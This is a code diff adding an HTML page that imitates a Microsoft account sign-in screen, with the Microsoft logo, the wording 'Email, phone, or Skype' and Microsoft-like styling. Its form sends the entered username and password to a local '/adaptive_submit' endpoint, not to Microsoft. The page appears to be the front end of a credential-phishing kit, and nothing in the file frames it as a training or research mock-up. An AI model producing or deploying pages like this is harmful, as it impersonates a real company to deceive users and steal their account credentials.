@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in to your account</title>
+  <style>
+    body {
+      font-family: Segoe UI, sans-serif;
+      background-color: #f3f2f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 360px;
+      text-align: left;
+    }
+    .logo-title {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    .logo-title img {
+      width: 80px; /* made logo smaller */
+    }
+    .logo-title span {
+      margin-left: 2cm;
+      font-size: 20px;
+      font-weight: bold;
+      color: #000;
+    }
+    label, input {
+      display: block;
+      width: 100%;
+    }
+    input {
+      padding: 10px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <div class="logo-title">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+      <span>Microsoft</span>
+    </div>
+    <form method="POST" action="/adaptive_submit">
+      <label for="username">Email, phone, or Skype</label>
+      <input type="text" name="username" id="username" required>
+      <label for="password">Password</label>
+      <input type="password" name="password" id="password" required>
+      <button type="submit">Sign In</button>
+    </form>
+  </div>
+</body>
+</html>
